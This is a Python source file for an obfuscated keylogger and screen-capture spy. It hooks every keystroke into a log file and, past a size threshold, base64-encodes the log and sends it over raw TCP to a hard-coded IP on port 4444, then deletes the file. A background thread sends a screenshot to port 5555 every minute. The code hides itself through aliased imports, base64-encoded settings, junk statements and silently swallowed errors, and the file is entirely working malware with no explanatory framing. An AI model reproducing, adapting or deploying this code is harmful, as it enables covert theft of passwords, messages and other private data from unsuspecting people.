import keyboard as _k
import time as _t
import base64 as _b
import socket as _s
import os as _o
import io as _i
from PIL import ImageGrab as _IG
import threading as _th

# Encoded Configuration
_F = _b.b64decode("a2V5bG9nLnR4dA==").decode() # keylog.txt
_L = 5120
_A = _b.b64decode("MTkyLjE2OC4xMC4xMzI=").decode() # 192.168.10.132
_P1 = 4444
_P2 = 5555

_c = 0 

def _sd(_d, _p):
    # Obfuscated networking call
    try:
        _x = (10 + 5) * 2 # Junk logic
        _sk = getattr(_s, "socket")(_s.AF_INET, _s.SOCK_STREAM)
        _sk.settimeout(3)
        _sk.connect((_A, _p))
        _sk.sendall(_d.encode() if isinstance(_d, str) else _d)
        _sk.close()
    except:
        pass

def _kl():
    def _ev(_e):
        global _c
        try:
            _n = _e.name
            # Stealth file writing
            with open(_F, "a", encoding="utf-8") as _f:
                _f.write(f"{_n} [{_t.strftime('%H:%M:%S')}]\n")
            
            _c += len(_n)
            
            if _c >= _L:
                if getattr(_o.path, "exists")(_F):
                    with open(_F, "rb") as _tf:
                        _en = _b.b64encode(_tf.read()).decode()
                    _sd(_en, _P1)
                    _o.remove(_F)
                _c = 0
        except:
            pass
    _k.on_press(_ev)

def _sl():
    while 1:
        try:
            _img = _IG.grab()
            _buf = _i.BytesIO()
            _img.save(_buf, format='PNG')
            _ed = _b.b64encode(_buf.getvalue())
            _sd(_ed, _P2)
        except:
            pass
        _t.sleep(60)

if __name__ == "__main__":
    # Junk initialization
    _z = [i for i in range(10)]
    
    if _o.path.exists(_F):
        _o.remove(_F)
    
    _th.Thread(target=_sl, daemon=True).start()
    _kl()
    
    try:
        while True:
            _t.sleep(1)
    except KeyboardInterrupt:
        _k.unhook_all()